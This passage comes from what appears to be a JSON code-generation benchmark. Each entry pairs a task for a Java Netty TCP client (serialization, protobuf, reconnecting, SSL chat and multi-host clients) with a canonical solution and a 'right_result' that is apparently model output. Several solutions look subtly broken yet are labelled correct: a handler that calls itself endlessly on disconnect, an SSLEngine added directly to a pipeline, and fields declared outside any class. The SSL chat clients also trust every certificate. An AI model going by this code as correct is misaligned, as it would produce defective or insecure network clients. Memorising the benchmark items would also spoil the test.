ChannelPipeline pipeline = ch.pipeline();\n                        if (sslContext != null) {\n                            pipeline.addLast(\"ssl\", createSslHandler(sslContext));\n                        }\n                        pipeline.addLast(\"handler\", new ChannelInboundHandlerAdapter() {\n                            @Override\n                            public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n                                channelInactive(ctx);\n                            }\n                        });\n                    }\n                });\n    }\n\n    public void start() {\n        connectProxyServer();\n    }\n\n    public ChannelHandler createSslHandler(SSLContext sslContext) {\n        try {\n            return new SslHandler(sslContext.createSSLEngine());\n        } catch (Exception e) {\n            logger.error(\"Failed to create SSL handler\", e);\n            return null;\n        }\n    }\n\n    public void connectProxyServer() {\n        bootstrap.connect(config.getProxyHost(), config.getProxyPort()).addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                logger.info(\"Successfully connected to proxy server\");\n                channel = future.channel();\n                sleepTimeMill = 1000; // Reset backoff after successful connection\n            } else {\n                logger.warn(\"Failed to connect to proxy server, retrying...\");\n                reconnectWait();\n                connectProxyServer();\n            }\n        });\n    }\n\n    public void stop() {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        workerGroup.shutdownGracefully();\n    }\n\n    public void channelInactive(ChannelHandlerContext ctx) {\n        logger.warn(\"Connection to proxy server lost, attempting reconnection...\");\n        reconnectWait();\n        connectProxyServer();\n    }\n\n    private void reconnectWait() {\n        try {\n            Thread.sleep(sleepTimeMill);\n            sleepTimeMill = Math.min(sleepTimeMill * 2, 30000); // Cap at 30 seconds\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            logger.error(\"Reconnect wait was interrupted\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 133,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a non-blocking connection to a remote server, send serialized objects, and handle graceful shutdown.\n\nClass Description: SerializationClient is a Netty-based TCP client that connects to a specified host and port, sends multiple instances of a serializable object (SerializationBean) to the server, and manages connection lifecycle including proper resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- Constructor: SerializationClient(String host, int port) -> None - Initializes the client with target server's host and port\n- run: void() throws Exception - Main method that:\n  1. Initializes Netty client components\n  2. Establishes TCP connection\n  3. Sends multiple serialized objects\n  4. Manages connection lifecycle and cleanup\n  5. Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class SerializationClient {\n\n    private final String host;\n    private final int port;\n\n    public SerializationClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new SerializationClientInitializer());\n\n            Channel channel = bootstrap.connect(host, port).sync().channel();\n\n            SerializationBean user = new SerializationBean();\n\n            for (int i = 0; i < 10; i++) {\n                user = new SerializationBean();\n                user.setAge(i);\n                user.setName(\"waylau\");\n                channel.write(user);\n            }\n            channel.flush();\n\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\n\nimport java.io.Serializable;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class SerializationClient {\n    private final String host;\n    private final int port;\n\n    public SerializationClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new ObjectEncoder());\n                            ch.pipeline().addLast(new ObjectDecoder(ClassResolvers.cacheDisabled(null)));\n                            ch.pipeline().addLast(new ClientHandler());\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class ClientHandler extends ChannelInboundHandlerAdapter {\n        private final AtomicInteger counter = new AtomicInteger(0);\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            for (int i = 0; i < 5; i++) {\n                SerializationBean bean = new SerializationBean(\"Message-\" + i, System.currentTimeMillis());\n                ctx.writeAndFlush(bean);\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static class SerializationBean implements Serializable {\n        private String message;\n        private long timestamp;\n\n        public SerializationBean(String message, long timestamp) {\n            this.message = message;\n            this.timestamp = timestamp;\n        }\n\n        // Getters and setters are optional if not used by the server\n    }\n}\n```"
  },
  {
    "Task_id": 134,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, handle Protocol Buffers (protobuf) message encoding/decoding, and manage connection lifecycle.\n\nClass Description: ProtobufProxy is a Netty-based TCP client implementation that connects to a specified server address and port, configures a pipeline for protobuf message processing, and manages connection resources. It implements a Proxy interface and handles graceful shutdown of network resources.\n\nMethods:\n\nconnect: [connect](String serverAddress, int port) -> void - Establishes a TCP connection to the specified server address and port. Configures the Netty pipeline with protobuf handlers and connection management components. The method blocks until the connection is closed and ensures proper resource cleanup.\n\nInput:\n- serverAddress: String - The IP address or hostname of the server to connect to\n- port: int - The TCP port number of the server\n\nOutput: None (void) - The method establishes a persistent connection that remains active until closed by either end",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.protobuf.ProtobufDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufEncoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.client.handler.ProtobufTransferHandler;\nimport org.nico.ratel.landlords.client.handler.SecondProtobufCodec;\nimport org.nico.ratel.landlords.entity.ClientTransferData;\nimport org.nico.ratel.landlords.print.SimplePrinter;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class ProtobufProxy implements Proxy {\n\n    @Override\n    public void connect(String serverAddress, int port) throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                    .addLast(new IdleStateHandler(0, 4, 0, TimeUnit.SECONDS))\n                                    .addLast(new ProtobufVarint32FrameDecoder())\n                                    .addLast(new ProtobufDecoder(ClientTransferData.ClientTransferDataProtoc.getDefaultInstance()))\n                                    .addLast(new ProtobufVarint32LengthFieldPrepender())\n                                    .addLast(new ProtobufEncoder())\n                                    .addLast(new SecondProtobufCodec())\n                                    .addLast(new ProtobufTransferHandler());\n                        }\n                    });\n            SimplePrinter.printNotice(\"Connecting to \" + serverAddress + \":\" + port);\n            Channel channel = bootstrap.connect(serverAddress, port).sync().channel();\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.protobuf.ProtobufDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufEncoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\n\npublic class ProtobufProxy implements Proxy {\n\n    private final EventLoopGroup group = new NioEventLoopGroup();\n\n    @Override\n    public void connect(String serverAddress, int port) {\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new ProtobufVarint32FrameDecoder());\n                            pipeline.addLast(new ProtobufDecoder(YourProtobufMessage.getDefaultInstance()));\n                            pipeline.addLast(new ProtobufVarint32LengthFieldPrepender());\n                            pipeline.addLast(new ProtobufEncoder());\n                            pipeline.addLast(new SimpleChannelInboundHandler<YourProtobufMessage>() {\n                                @Override\n                                protected void channelRead0(ChannelHandlerContext ctx, YourProtobufMessage msg) {\n                                    // Handle incoming protobuf message\n                                }\n\n                                @Override\n                                public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                    cause.printStackTrace();\n                                    ctx.close();\n                                }\n                            });\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(serverAddress, port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 135,
    "Instruction": "Task Description: Create a Java class that implements a Netty TCP client for establishing and managing non-blocking TCP connections to a remote server, handling message sending, and providing reconnection capabilities.\n\nClass Description: The `NettyClient` class is a Spring component that manages a Netty-based TCP client. It handles connection establishment, message sending, automatic reconnection on failure, and graceful shutdown. The client uses Netty's non-blocking I/O model with NioSocketChannel for efficient communication.\n\nAttributes:\n- `RECONNECT_SECONDS`: Integer - The delay in seconds before attempting to reconnect after a connection failure.\n- `logger`: Logger - SLF4J logger for logging client activities and errors.\n- `serverHost`: String - The host address of the remote server to connect to (injected via Spring).\n- `serverPort`: Integer - The port number of the remote server to connect to (injected via Spring).\n- `eventGroup`: EventLoopGroup - Netty event loop group for managing I/O threads.\n- `channel`: Channel - The active channel representing the connection to the server (volatile for thread safety).\n\nMethods:\n- `start()`: void - Initializes and starts the Netty client, attempting to connect to the server. Uses Bootstrap to configure client settings and sets up connection listener.\n- `reconnect()`: void - Schedules a reconnection attempt after a connection failure, using the specified RECONNECT_SECONDS delay.\n- `shutdown()`: void - Gracefully shuts down the client by closing the active channel and releasing event loop resources (annotated with @PreDestroy for Spring lifecycle management).\n- `send(Invocation invocation)`: void - Sends a message to the server through the active channel. Validates channel state before sending.",
    "Canonical_solution": "import cn.iocoder.springboot.lab67.nettyclientdemo.client.handler.NettyClientHandlerInitializer;\nimport cn.iocoder.springboot.lab67.nettycommondemo.codec.Invocation;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class NettyClient {\n\n    private static final Integer RECONNECT_SECONDS = 20;\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    @Value(\"${netty.server.host}\")\n    private String serverHost;\n    @Value(\"${netty.server.port}\")\n    private Integer serverPort;\n\n    private EventLoopGroup eventGroup = new NioEventLoopGroup();\n    private volatile Channel channel;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(eventGroup)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(serverHost, serverPort)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new NettyClientHandlerInitializer());\n\n        bootstrap.connect().addListener(new ChannelFutureListener() {\n            @Override\n            public void operationComplete(ChannelFuture future) throws Exception {\n                if (!future.isSuccess()) {\n                    logger.error(\"[start][Netty Client connection to server({}:{}) failed]\", serverHost, serverPort);\n                    reconnect();\n                    return;\n                }\n                channel = future.channel();\n                logger.info(\"[start][Netty Client connected to server({}:{}) successfully]\", serverHost, serverPort);\n            }\n        });\n    }\n\n    public void reconnect() {\n        eventGroup.schedule(new Runnable() {\n            @Override\n            public void run() {\n                logger.info(\"[reconnect][Starting reconnection]\");\n                try {\n                    start();\n                } catch (InterruptedException e) {\n                    logger.error(\"[reconnect][Reconnection failed]\", e);\n                }\n            }\n        }, RECONNECT_SECONDS, TimeUnit.SECONDS);\n        logger.info(\"[reconnect][Will attempt reconnection in {} seconds]\", RECONNECT_SECONDS);\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        eventGroup.shutdownGracefully();\n    }\n\n    public void send(Invocation invocation) {\n        if (channel == null) {\n            logger.error(\"[send][Connection does not exist]\");\n            return;\n        }\n        if (!channel.isActive()) {\n            logger.error(\"[send][Connection({}) is not active]\", channel.id());\n            return;\n        }\n        channel.writeAndFlush(invocation);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PreDestroy;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class NettyClient {\n\n    private static final int RECONNECT_SECONDS = 5;\n    private final Logger logger = LoggerFactory.getLogger(NettyClient.class);\n    @Value(\"${server.host}\")\n    private String serverHost;\n    @Value(\"${server.port}\")\n    private int serverPort;\n    private EventLoopGroup eventGroup = new NioEventLoopGroup();\n    private volatile Channel channel;\n\n    public void start() {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(eventGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<NioSocketChannel>() {\n                    @Override\n                    protected void initChannel(NioSocketChannel ch) {\n                        // Add necessary channel handlers here\n                    }\n                })\n                .option(ChannelOption.SO_KEEPALIVE, true);\n\n        doConnect(bootstrap);\n    }\n\n    private void doConnect(Bootstrap bootstrap) {\n        bootstrap.connect(serverHost, serverPort).addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                logger.info(\"Successfully connected to server at {}:{}\", serverHost, serverPort);\n                channel = future.channel();\n            } else {\n                logger.warn(\"Failed to connect to server, retrying in {} seconds\", RECONNECT_SECONDS);\n                future.channel().eventLoop().schedule(this::reconnect, RECONNECT_SECONDS, TimeUnit.SECONDS);\n            }\n        });\n    }\n\n    private void reconnect() {\n        logger.info(\"Reconnecting to server...\");\n        doConnect(new Bootstrap()\n                .group(eventGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<NioSocketChannel>() {\n                    @Override\n                    protected void initChannel(NioSocketChannel ch) {\n                        // Add necessary channel handlers here\n                    }\n                })\n                .option(ChannelOption.SO_KEEPALIVE, true));\n    }\n\n    public void send(Invocation invocation) {\n        if (channel != null && channel.isActive()) {\n            channel.writeAndFlush(invocation);\n        } else {\n            logger.warn(\"Cannot send message: connection is not active.\");\n        }\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        logger.info(\"Shutting down Netty client.\");\n        if (channel != null) {\n            channel.close();\n        }\n        eventGroup.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 136,
    "Instruction": "Task Description: Create a secure TCP chat client using Java Netty framework that establishes an SSL encrypted connection to a remote server, sends user input messages, and gracefully handles connection termination.\n\nClass Description: SecureChatClient is a Netty-based TCP client that connects to a secure chat server, sends messages from standard input, and properly manages connection lifecycle and resources.\n\nAttributes:\nHOST: String - The server host address (default: \"127.0.0.1\")\nPORT: int - The server port number (default: 8992)\n\nMethods:\nmain: main(String[] args) -> void - Entry point that initializes SSL context, configures Netty client, establishes connection, handles user input, and manages shutdown\n    - args: String[] - Command line arguments (unused in current implementation)\n    - Returns: void",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class SecureChatClient {\n\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx = SslContextBuilder.forClient()\n            .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new SecureChatClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport javax.net.ssl.SSLEngine;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SecureChatClient {\n    static final String HOST = \"127.0.0.1\";\n    static final int PORT = 8992;\n\n    public static void main(String[] args) throws Exception {\n        SslContext sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n\n        EventLoopGroup group = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new ChannelInitializer<>() {\n                 @Override\n                 protected void initChannel(Channel ch) throws Exception {\n                     SSLEngine engine = sslCtx.newEngine(ch.alloc(), HOST, PORT);\n                     ch.pipeline().addLast(engine);\n                     ch.pipeline().addLast(new StringEncoder());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            Channel channel = f.channel();\n\n            BufferedReader console = new BufferedReader(new InputStreamReader(System.in));\n            System.out.println(\"Enter messages to send (type 'exit' to quit):\");\n            for (;;) {\n                String line = console.readLine();\n                if (line == null || \"exit\".equals(line.toLowerCase())) {\n                    break;\n                }\n                channel.writeAndFlush(line + \"\\r\\n\");\n            }\n\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 137,
    "Instruction": "Task Description: Implement a TCP client using Java Netty framework that can maintain persistent connections to multiple hosts and send messages to them.\n\nClass Description: This class provides functionality to initialize and manage Netty TCP client connections to multiple hosts. It maintains a connection pool using maps to store active channels and their associated event loop groups.\n\nAttributes:\n- channelMap: Map<String, Channel> - Stores active channels mapped by host address\n- groupMap: Map<String, NioEventLoopGroup> - Stores event loop groups mapped by host address\n\nMethods:\n- initSocketClientAndSendMessage(String host, String message) -> Channel - Initializes a new TCP client connection to the specified host if one doesn't exist, or reuses an existing connection. Sends the provided message to the host. Returns the Channel object for the connection.\n  - Input Parameters:\n    - host: String - The host address to connect to\n    - message: String - The message to be sent to the host\n  - Return Type: Channel - The Netty Channel object representing the connection",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.bytes.ByteArrayEncoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.Charset;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic static Map<String, Channel> channelMap;\npublic static Map<String, NioEventLoopGroup> groupMap;\n\n@Override\npublic Channel initSocketClientAndSendMessage(String host, String message) throws Exception {\n    if(channelMap==null){\n        channelMap = new HashMap<>();\n    }\n    if(groupMap==null){\n        groupMap = new HashMap<>();\n    }\n\n    if(channelMap.get(host)==null){\n        NioEventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(new InetSocketAddress(host, 9003))\n                .handler(new ChannelInitializer() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        ch.pipeline().addLast(new StringEncoder(Charset.forName(\"GBK\")));\n                        ch.pipeline().addLast(new ByteArrayEncoder());\n                        ch.pipeline().addLast(new ChunkedWriteHandler());\n                    }\n                });\n            ChannelFuture cf = b.connect();\n            channelMap.put(host, cf.channel());\n            groupMap.put(host, group);\n            return null;\n        } catch (Exception e){\n            group.shutdownGracefully().sync();\n            return null;\n        }\n    }else{\n        channelMap.get(host).writeAndFlush(StringTools.hexStringToBytes(message));\n        return channelMap.get(host);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\nimport java.net.InetSocketAddress;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class MultiHostTcpClient {\n    private final Map<String, Channel> channelMap = new ConcurrentHashMap<>();\n    private final Map<String, NioEventLoopGroup> groupMap = new ConcurrentHashMap<>();\n\n    public Channel initSocketClientAndSendMessage(String host, String message) {\n        if (channelMap.containsKey(host)) {\n            Channel channel = channelMap.get(host);\n            if (channel.isActive()) {\n                channel.writeAndFlush(message);\n                return channel;\n            } else {\n                closeConnection(host);\n            }\n        }\n\n        NioEventLoopGroup group = new NioEventLoopGroup();\n        groupMap.putIfAbsent(host, group);\n\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new SimpleChannelInboundHandler<Object>() {\n                            @Override\n                            protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n                                // Handle incoming messages if needed\n                            }\n                        });\n                    }\n                });\n\n        try {\n            ChannelFuture future = bootstrap.connect(new InetSocketAddress(host, 8080)).sync();\n            Channel channel = future.channel();\n            channel.writeAndFlush(Unpooled.copiedBuffer(message.getBytes()));\n            channelMap.put(host, channel);\n            return channel;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private void closeConnection(String host) {\n        Channel channel = channelMap.remove(host);\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        NioEventLoopGroup group = groupMap.remove(host);\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 138,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for network communication, capable of establishing connections, sending/receiving messages, and gracefully shutting down.\n\nClass Description: NettyRemotingClient is a Netty-based TCP client implementation that handles network communication with a remote server. It manages connection lifecycle, message encoding/decoding, and provides synchronous invocation capabilities.\n\nAttributes:\n- bootstrap: [Bootstrap] - Netty's Bootstrap instance for client configuration\n- eventLoopGroupWorker: [EventLoopGroup] - Manages client-side I/O threads\n\nMethods:\n- NettyRemotingClient(): [Constructor] -> [void] - Initializes the client with NioEventLoopGroup and configures Bootstrap with NioSocketChannel, TCP_NODELAY option, and pipeline handlers (encoder, decoder, and client handler)\n- createChannel(String addr): [String addr (host:port format)] -> [ChannelFuture] - Creates a channel connection to the specified address, throws RemotingConnectException if connection fails\n- invokeSync(Channel channel, RemotingCommand request, long timeoutMillis): [Channel channel, RemotingCommand request, long timeoutMillis] -> [CompletableFuture<RemotingCommand>] - Sends a request synchronously through the channel and returns a CompletableFuture for the response\n- shutdown(): [void] -> [void] - Gracefully shuts down the event loop group and releases resources\n- NettyClientHandler: [Inner Class] -> [void] - Handles incoming messages from the server (extends SimpleChannelInboundHandler<RemotingCommand>)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.apache.rocketmq.remoting.exception.RemotingConnectException;\nimport org.apache.rocketmq.remoting.protocol.RemotingCommand;\n\nimport java.util.concurrent.CompletableFuture;\n\npublic class NettyRemotingClient {\n\n    private final Bootstrap bootstrap = new Bootstrap();\n    private final EventLoopGroup eventLoopGroupWorker;\n\n    public NettyRemotingClient() {\n        this.eventLoopGroupWorker = new NioEventLoopGroup();\n        this.bootstrap.group(this.eventLoopGroupWorker)\n            .channel(NioSocketChannel.class)\n            .option(ChannelOption.TCP_NODELAY, true)\n            .option(ChannelOption.SO_KEEPALIVE, false)\n            .handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(\n                        new NettyEncoder(),\n                        new NettyDecoder(),\n                        new NettyClientHandler());\n                }\n            });\n    }\n\n    public ChannelFuture createChannel(String addr) throws InterruptedException, RemotingConnectException {\n        String[] hostAndPort = addr.split(\":\");\n        ChannelFuture channelFuture = bootstrap.connect(hostAndPort[0], Integer.parseInt(hostAndPort[1])).sync();\n        if (!channelFuture.isSuccess()) {\n            throw new RemotingConnectException(addr);\n        }\n        return channelFuture;\n    }\n\n    public CompletableFuture<RemotingCommand> invokeSync(Channel channel, RemotingCommand request, long timeoutMillis) {\n        CompletableFuture<RemotingCommand> future = new CompletableFuture<>();\n        try {\n            channel.writeAndFlush(request).addListener(f -> {\n                if (f.isSuccess()) {\n                    // Handle response logic here\n                } else {\n                    future.completeExceptionally(f.cause());\n                }\n            });\n        } catch (Exception e) {\n            future.completeExceptionally(e);\n        }\n        return future;\n    }\n\n    public void shutdown() {\n        this.eventLoopGroupWorker.shutdownGracefully();\n    }\n\n    class NettyClientHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            // Process incoming messages\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
